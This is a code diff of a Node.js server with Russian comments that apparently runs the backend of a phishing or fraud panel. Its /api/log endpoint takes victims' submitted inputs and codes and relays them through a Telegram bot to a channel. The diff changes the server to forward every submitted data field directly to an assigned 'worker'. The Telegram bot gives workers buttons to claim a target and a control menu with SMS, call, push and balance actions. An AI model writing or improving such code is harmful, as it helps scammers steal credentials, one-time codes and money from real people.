@@ -59,9 +59,13 @@ app.post('/api/log', async (req, res) => {
         ] 
     };
 
+    // Формируем заголовок для канала
     let title = connection ? `⚠️ ПОВТОРНЫЙ ЛОГ` : `🆕 НОВЫЙ ЛОГ`;
-    if (type.includes('ОТВЕТ') || type.includes('ВВОД') || type.includes('CODE')) title = `📩 ОТВЕТ ЮЗЕРА`;
+    if (type.includes('ОТВЕТ') || type.includes('ВВОД') || type.includes('CODE')) {
+        title = `📩 ОТВЕТ ЮЗЕРА`;
+    }
 
+    // Отправляем в общий канал
     await sendTg('sendMessage', {
         chat_id: CHANNEL_ID,
         text: `<b>${title} [${safeText(type)}]</b>\n🆔 ID: <code>${userId}</code>`,
@@ -69,11 +73,23 @@ app.post('/api/log', async (req, res) => {
         reply_markup: channelButtons
     });
 
-    if (connection && (type.includes('ОТВЕТ') || type.includes('ВВОД') || type.includes('CODE'))) {
-        let replyMsg = `<b>📩 ОТВЕТ ОТ [<code>${userId}</code>]</b>\n\n`;
-        for (let key in data) { replyMsg += `<b>${key}:</b> <code>${data[key]}</code>\n`; }
-        await sendTg('sendMessage', { chat_id: connection.workerId, text: replyMsg, parse_mode: 'HTML' });
+    // --- ЛОГИКА ДЛЯ ВОРКЕРА ---
+    if (connection) {
+        let updateMsg = `<b>🔔 ОБНОВЛЕНИЕ [<code>${userId}</code>]</b>\n`;
+        updateMsg += `📍 Тип: <b>${safeText(type)}</b>\n\n`;
+        
+        for (let key in data) { 
+            updateMsg += `<b>${key}:</b> <code>${data[key]}</code>\n`; 
+        }
+
+        // Отправляем лично воркеру в бот
+        await sendTg('sendMessage', { 
+            chat_id: connection.workerId, 
+            text: updateMsg, 
+            parse_mode: 'HTML' 
+        });
     }
+    
     res.json({ success: true });
 });
 
@@ -90,7 +106,7 @@ app.post('/tg-webhook', async (req, res) => {
     if (message && message.text) {
         const chatId = message.chat.id;
         if (message.text === '/start') {
-            return sendTg('sendMessage', { chat_id: chatId, text: "<b>👋 Бот готов.</b>", parse_mode: 'HTML' });
+            return sendTg('sendMessage', { chat_id: chatId, text: "<b>👋 Бот готов. Жди логи!</b>", parse_mode: 'HTML' });
         }
 
         if (waitingForCustomText[chatId]) {
@@ -124,7 +140,7 @@ app.post('/tg-webhook', async (req, res) => {
                 }
             });
 
-            // В боте: выводим меню управления
+            // В боте: меню управления
             const controlKeyboard = [
                 [{ text: "💬 СМС", callback_data: `use_${userId}_sms` }, { text: "📞 Звонок", callback_data: `use_${userId}_call` }],
                 [{ text: "📲 Пуш", callback_data: `use_${userId}_push` }, { text: "💰 Баланс", callback_data: `use_${userId}_bal` }],
@@ -141,7 +157,6 @@ app.post('/tg-webhook', async (req, res) => {
 
         if (action === 'release') {
             await Worker.findOneAndDelete({ targetUserId: userId });
-            // Возвращаем кнопку "Взять" в канал
             await sendTg('editMessageReplyMarkup', {
                 chat_id: CHANNEL_ID,
                 message_id: code, 
